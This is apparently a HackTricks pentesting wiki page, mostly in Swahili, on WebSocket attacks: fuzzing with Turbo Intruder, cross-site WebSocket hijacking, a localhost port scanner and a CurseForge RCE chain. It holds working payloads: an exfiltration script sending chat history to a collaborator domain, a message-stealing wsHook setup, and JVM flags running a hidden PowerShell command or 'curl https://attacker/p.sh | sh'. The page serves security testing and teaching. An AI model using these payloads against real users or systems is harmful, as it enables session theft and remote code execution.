# Mashambulizi ya WebSocket

{{#include ../banners/hacktricks-training.md}}

## WebSockets ni nini

Muunganisho wa WebSocket huanzishwa kupitia handshake ya awali ya **HTTP** na zimetengenezwa kuwa **ya muda mrefu**, zikiruhusu ujumbe wa pande zote kwa wakati wowote bila hitaji la mfumo wa miamala. Hii inafanya WebSockets kuwa na faida hasa kwa program zinazohitaji **latency ya chini au mawasiliano yanayoanzishwa na server**, kama vile mtiririko wa data za kifedha za moja kwa moja.

### Uanzishaji wa Muunganisho wa WebSocket

Maelezo ya kina juu ya uanzishaji wa muunganisho wa WebSocket yanaweza kupatikana [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Kwa muhtasari, muunganisho wa WebSocket kawaida huanzishwa kupitia JavaScript upande wa mteja kama inavyoonyeshwa hapa chini:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
The `wss` protocol inaonyesha muunganisho wa WebSocket uliolindwa na **TLS**, wakati `ws` inaashiria muunganisho **usio salama**.

Wakati wa kuanzishwa kwa muunganisho, handshake hufanywa kati ya kivinjari na seva kupitia HTTP. Mchakato wa handshake unahusisha kivinjari kutuma ombi na seva kujibu, kama inavyoonyeshwa katika mifano ifuatayo:

Kivinjari kinatuma ombi la handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Jibu la handshake la Server:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Muunganisho unabaki wazi kwa kubadilishana ujumbe kwa mwelekeo yote miwili mara tu unapoundwa.

**Vidokezo Muhimu vya Handshake ya WebSocket:**

- Vichwa vya `Connection` na `Upgrade` vinaonyesha kuanzishwa kwa handshake ya WebSocket.
- Kichwa `Sec-WebSocket-Version` kinaonyesha toleo la protocol ya WebSocket linalotakiwa, kawaida `13`.
- Thamani ya nasibu iliyofumwa kwa Base64 inatumwa kwenye kichwa `Sec-WebSocket-Key`, kuhakikisha kila handshake ni ya kipekee, jambo ambalo husaidia kuzuia matatizo na proksi zinazotumia cache. Thamani hii si kwa ajili ya uthibitishaji bali kuthibitisha kuwa jibu halijatengenezwa na server au cache iliyopangwa vibaya.
- Kichwa `Sec-WebSocket-Accept` katika jibu la server ni hash ya `Sec-WebSocket-Key`, ikithibitisha nia ya server ya kufungua muunganisho wa WebSocket.

Sifa hizi zinahakikisha kuwa mchakato wa handshake ni salama na wa kuaminika, na kuweka msingi kwa mawasiliano ya wakati halisi yenye ufanisi.

### Konsoli ya Linux

Unaweza kutumia `websocat` kuanzisha muunganisho mbichi na websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Au kuunda websocat server:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket miunganisho

Ikiwa utagundua kwamba clients wameunganishwa kwenye **HTTP websocket** kutoka kwenye mtandao wa ndani ulipo sasa unaweza kujaribu [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) ili kufanya MitM attack kati ya client na server.\
Mara client anapojaribu kuungana kwako unaweza kisha kutumia:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Uorodheshaji wa Websockets

Unaweza kutumia **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) ili kugundua, kuchanganua fingerprint na kutafuta **vulnerabilities** zinazojulikana kwenye websockets kwa njia ya moja kwa moja.

### Websocket Debug tools

- **Burp Suite** inaunga mkono mawasiliano ya MitM ya websockets kwa njia inayofanana sana na ile ya mawasiliano ya kawaida ya HTTP.
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** itakuwezesha kusimamia vizuri zaidi mawasiliano ya Websocket ndani ya Burp kwa kupata **history**, kuweka **interception rules**, kutumia sheria za **match and replace**, na kutumia **Intruder** na **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Mfupi kwa "**WebSocket/Socket.io Proxy**", tool hii, imeandikwa kwa Node.js, inatoa user interface ya **capture, intercept, send custom** messages na kuona mawasiliano yote ya WebSocket na Socket.IO kati ya client na server.
- [**wsrepl**](https://github.com/doyensec/wsrepl) ni **interactive websocket REPL** iliyoundwa mahsusi kwa penetration testing. Inatoa interface ya kuangalia **incoming websocket messages and sending new ones**, pamoja na framework rahisi ya kutumia kwa **automating** mawasiliano haya.
- [**https://websocketking.com/**](https://websocketking.com/) ni tovuti ya kuwasiliana na tovuti nyingine kwa kutumia **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) miongoni mwa aina nyingine za communications/protocols, inatoa tovuti ya kuwasiliana na tovuti nyingine kwa kutumia **websockets.**

## Kufungua Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Maabara ya Websocket

Katika [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) una code ya kuanzisha web inayotumia websockets na katika [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) unaweza kupata ufafanuzi.

## Websocket Fuzzing

The burp extension [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) sasa inaruhusu pia kufuzz WebSocket messages. Unaweza kusoma taarifa zaidi kuhusu hili [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

WebSocket Turbo Intruder ya PortSwigger inaleta Turbo Intruder–style Python scripting na fuzzing ya high‑rate kwa WebSockets. Sakinisha kutoka BApp Store au kutoka source. Inajumuisha vipengele viwili:

- Turbo Intruder: high‑volume messaging kwa endpoint moja ya WS kwa kutumia custom engines.
- HTTP Middleware: inaweka wazi endpoint ya HTTP ya ndani inayotuma bodies kama ujumbe za WS kupitia connection endelevu, hivyo scanner yoyote inayotegemea HTTP inaweza kuchunguza WS backends.

Mfano wa script wa msingi wa kufuzz endpoint ya WS na kuchuja majibu yanayofaa:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Tumia decorators kama `@MatchRegex(...)` kupunguza kelele wakati ujumbe mmoja unasababisha majibu mengi.

### Daraja WS nyuma ya HTTP (HTTP Middleware)

Zungusha muunganisho wa WS unaodumu na tuma HTTP bodies kama ujumbe za WS kwa ajili ya upimaji wa kiotomatiki kwa kutumia HTTP scanners:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Kisha tuma HTTP kwa ndani; body hutumwa kama ujumbe wa WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Hii inakuwezesha kuendesha WS backends wakati ukichuja matukio yanayovutia (mf., SQLi errors, auth bypass, command injection behavior).

### Ushughulikiaji wa Socket.IO (handshake, heartbeats, events)

Socket.IO inaongeza framing yake juu ya WS. Tambua kwa kutumia query parameter inayohitajika `EIO` (mf., `EIO=4`). Weka session hai kwa kutumia Ping (`2`) na Pong (`3`) na anza mazungumzo na `"40"`, kisha tuma matukio kama `42["message","hello"]`.

Mfano wa Intruder:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Tofauti ya HTTP adapter:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Kugundua server‑side prototype pollution kupitia Socket.IO

Kufuata tekniki salama ya utambuzi ya PortSwigger, jaribu kuchafua internals za Express kwa kutuma payload kama:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), you likely polluted server-side prototypes. Athari zinategemea reachable sinks; correlate with the gadgets in the Node.js prototype pollution section. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

The default engine batches messages on one connection (great throughput, poor for races). Tumia engine ya THREADED kuanzisha connections nyingi za WS na kuwasha payloads kwa parallel ili kusababisha logic races (double‑spend, token reuse, state desync). Anza kutoka kwenye example script na rekebisha concurrency katika `config()`.

- Jifunze methodology na mbadala katika [Race Condition](race-condition.md) (ona “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Craft WS frames ambazo header inatangaza payload length kubwa lakini hazitumii body. Baadhi ya WS servers huamini length na kupre‑allocate buffers; kuweka karibu na `Integer.MAX_VALUE` kunaweza kusababisha Out‑Of‑Memory na remote unauth DoS. Angalia example script.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Enable the WS Logger to capture and correlate messages using internal IDs.
- Tumia `inc*`/`dec*` helpers kwenye `Connection` kurekebisha message ID handling katika complex adapters.
- Decorators kama `@PingPong`/`@Pong` na helpers kama `isInteresting()` hupunguza noise na kuendelea kuendelea sessions.

### Operational safety

High‑rate WS fuzzing inaweza kufungua connections nyingi na kutuma maelfu ya messages kwa sekunde. Malformed frames na rates za juu zinaweza kusababisha DoS halisi. Tumia tu pale iliyoruhusiwa.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, pia inajulikana kama **cross-origin WebSocket hijacking**, inatambulika kama kesi maalum ya **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** inayoathiri WebSocket handshakes. Haiba hii hutokea wakati WebSocket handshakes zinathibitishwa kwa kutumia tu **HTTP cookies** bila **CSRF tokens** au hatua nyingine za usalama.

Wavamizi wanaweza kuibadilisha kwa kuhosta **malicious web page** inayosababisha cross-site WebSocket connection kwa application yenye udhaifu. Kwa hiyo, connection hiyo inachukuliwa kuwa sehemu ya session ya mwathirika na application, ikitumia ukosefu wa CSRF protection katika mekanisma ya session handling.

Ili shambulio hili lifanyike, mahitaji ni:

- The websocket **authentication must be cookie based**
- The cookie must be accessible from the attackers server (this usually means **`SameSite=None`**) and no **Firefox Total Cookie Protection** enabled in Firefox and no **blocked third-party cookies** in Chrome.
- The websocket server must not check the origin of the connection (or this must be bypasseable)

Also:

- If the authentication is based on a local connection (to localhost or to a local network) the attack **will be possible** as no current protection forbids it (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Kumbuka kwamba wakati wa **establishing** connection ya **websocket** the **cookie** inatumwa kwa server. The **server** inaweza kuitumia kuhusisha kila **specific** **user** na yake **websocket** **session** kwa msingi wa cookie iliyotumwa.

Kama, kwa **mfano**, server ya **websocket** inarudisha history ya mazungumzo ya user ikiwa msg yenye "**READY"** imetumwa, basi **simple XSS** inayounda connection (cookie ita sendwa **automatically** ili kuidhinisha user wa mwathirika) **kutuma** "**READY**" itaweza **kupakua** history ya **conversation**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie na subdomain tofauti

Katika chapisho la blogu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) mshambuliaji aliweza **execute arbitrary Javascript in a subdomain** ya domain ambapo mawasiliano ya Websocket yalikuwa yakiendelea. Kwa sababu ilikuwa **subdomain**, **cookie** ilikuwa iki**sent**, na kwa sababu **Websocket didn't check the Origin properly**, ilikuwa inawezekana kuwasiliana nayo na **steal tokens from it**.

### Kunyang'anya data kutoka kwa mtumiaji

Nakili web application unayotaka kuiga (faili za .html kwa mfano) na ndani ya script ambapo websocket communication inafanyika ongeza code hii:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Sasa pakua faili `wsHook.js` kutoka [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) na **ihifadhi ndani ya saraka yenye faili za wavuti**.\
Ukiifichua programu ya wavuti na kumfanya mtumiaji kuungana nayo utaweza kuiba ujumbe uliotumwa na uliopokelewa kupitia websocket:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Ulinzi

Shambulio la CSWSH linategemea ukweli kwamba **mtumiaji ataingia kwenye ukurasa mbaya** ambao uta**fungua websocket connection** kwa ukurasa wa wavuti ambapo mtumiaji tayari ameunganishwa na utaidhinishwa kama yeye kwa kuwa ombi litatuma cookies za mtumiaji.

Sasa hivi, ni rahisi sana kuzuia tatizo hili:

- **Websocket server checking the origin**: Server ya websocket inapaswa kila wakati kukagua wapi mtumiaji anaunganishwa kutoka ili kuzuia kurasa zisizotarajiwa kuunganishwa nayo.
- **Authentication token**: Badala ya kutegemea uthibitisho kwa cookie, websocket connection inaweza kutegemea token iliyotengenezwa na server kwa mtumiaji ambayo mshambuliaji hawayajui (kama anti-CSRF token).
- **SameSite Cookie attribute**: Cookies zenye thamani ya `SameSite` kuwa `Lax` au `Strict` hazitatumwa kutoka ukurasa wa mshambulizi wa nje kwenda server ya mwathiri, kwa hivyo, authentication inayotegemea cookie haitafanikiwa. Kumbuka kwamba Chrome sasa huweka thamani **`Lax`** kwa cookies ambazo hazijataja bendera hii, ikifanya hii kuwa salama kwa default. Hata hivyo, kwa dakika za kwanza 2 baada ya cookie kuundwa itakuwa na thamani **`None`**, na kufanya iwe hatarishi kwa kipindi hicho kifupi (pia inatarajiwa kwamba kipimo hiki kitatoweka baadaye).
- **Firefox Total Cookie Protection**: Total Cookie Protection inafanya kazi kwa kutenganisha cookies kwa tovuti ambazo zimetengenezwa. Kimsingi kila tovuti ina sehemu yake ya kuhifadhi cookies ili kuzuia wahusika wa tatu kuunganisha historia ya kuvinjari ya mtumiaji. Hii inafanya **CSWSH isiyoweza kutumika** kwani tovuti ya mshambulizi haitakuwa na ufikiaji wa cookies.
- **Chrome third-party cookies block**: Hii pia inaweza kuzuia kutumwa kwa cookie ya mtumiaji aliyethibitishwa kwa server ya websocket hata ukiwa na `SameSite=None`.

### Matumizi mabaya ya Localhost WebSocket na ugundaji wa bandari za kivinjari

Desktop launchers mara nyingi huanzisha wasaidizi (mfano, CurseForge's `CurseAgent.exe`) ambao hufungua JSON-RPC WebSockets kwenye `127.0.0.1:<random_port>`. Kivinjari **hakutekelezi SOP kwenye loopback sockets**, hivyo ukurasa wowote wa wavuti unaweza kujaribu handshake. Ikiwa agent inakubali thamani za `Origin` kiholela na kuruka uthibitisho wa pili, uso wa IPC unageuka kuwa unaoweza kudhibitiwa kwa mbali moja kwa moja kutoka JavaScript.

#### Kuorodhesha methods zilizo wazi

Chukua session halali ili kujifunza mkataba wa protocol. CurseForge, kwa mfano, hutuma frames kama `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` ambapo `name` ni RPC method na `args` ina vitu vilivyopangwa (GUIDs, resolution, flags, n.k.). Mara muundo huu utakapo julikana unaweza kuitisha methods kama `createModpack`, `minecraftGetDefaultLocation`, au kazi nyingine yoyote yenye ruhusa moja kwa moja kutoka ukurasa uliyoingizwa.

#### Ugundaji wa bandari unaofanywa kwa upande wa kivinjari

Kwa sababu msaidizi huweka binding kwa port ya juu ya nasibu, exploit kwanza hufanya brute-forces localhost kwa kupitia WebSockets. Vivinjari vinavyotegemea Chromium vinavumilia takriban ~16k za upgrades zilizoshindwa kabla ya throttling, ambayo ni ya kutosha kuvuka anuwai ya ephemeral; Firefox kwa kawaida huanguka au kuganda baada ya makosa ya mamia, hivyo PoCs za vitendo mara nyingi hulenga Chromium.

<details>
<summary>Skana ndogo ya kivinjari</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Mara tu connection inapopitia handshake na kurudisha protocol-specific data, tumia tena socket hiyo kwa RPC chain.

#### Kuunganisha JSON-RPC methods kuwa RCE

CurseForge exploit inaunganisha calls mbili zisizothibitishwa:

1. `createModpack` → inarudisha `MinecraftInstanceGuid` mpya bila mwingiliano wa mtumiaji.
2. `minecraftTaskLaunchInstance` → inaanzisha GUID hiyo wakati inakubali zozote za JVM flags kupitia `AdditionalJavaArguments`.

JNI/JVM diagnostic options kisha hutoa turnkey RCE primitive. Kwa mfano, weka kikomo cha metaspace ili kulazimisha crash na utumie error hook kwa utekelezaji wa amri:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Kwenye malengo ya Unix badilisha tu payload na `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Hii inafanya kazi hata wakati huwezi kugusa code ya application—udhibiti wa CLI ya JVM unatosha.

Mfumo huu wa “create resource → privileged launch” mara nyingi huonekana katika updaters na launchers. Kila wakati method (1) inatoa kitambulisho kinachofuatiliwa na server na method (2) inatekeleza code au kuanzisha process kwa kutumia kitambulisho hicho, angalia kama huwezi kuingiza arguments zinazodhibitiwa na mtumiaji.


## Race Conditions

Race Conditions katika Web Sockets pia zinatokea, [angalia taarifa hii kujifunza zaidi](race-condition.md#rc-in-websockets).

## Udhaifu mwingine

Kama Web Sockets ni mekanisma ya **kutuma data kwa upande wa server na upande wa client**, kulingana na jinsi server na client zinavyoshughulikia taarifa, **Web Sockets zinaweza kutumika kutekeleza udhaifu mwingine kama XSS, SQLi au hata web vuln nyingine yoyote ya kawaida kwa kutumia input ya mtumiaji kutoka kwa websocket.**

## **WebSocket Smuggling**

Kiwango hiki cha udhaifu kinaweza kukuruhusu **kupita vizingiti vya reverse proxies** kwa kuwafanya waamini kwamba mawasiliano ya **websocket yalikuwa yameanzishwa** (hata kama si kweli). Hii inaweza kumruhusu mwizi kupata **endpoints zilizofichwa**. Kwa maelezo zaidi angalia ukurasa ufuatao:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## Marejeo

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
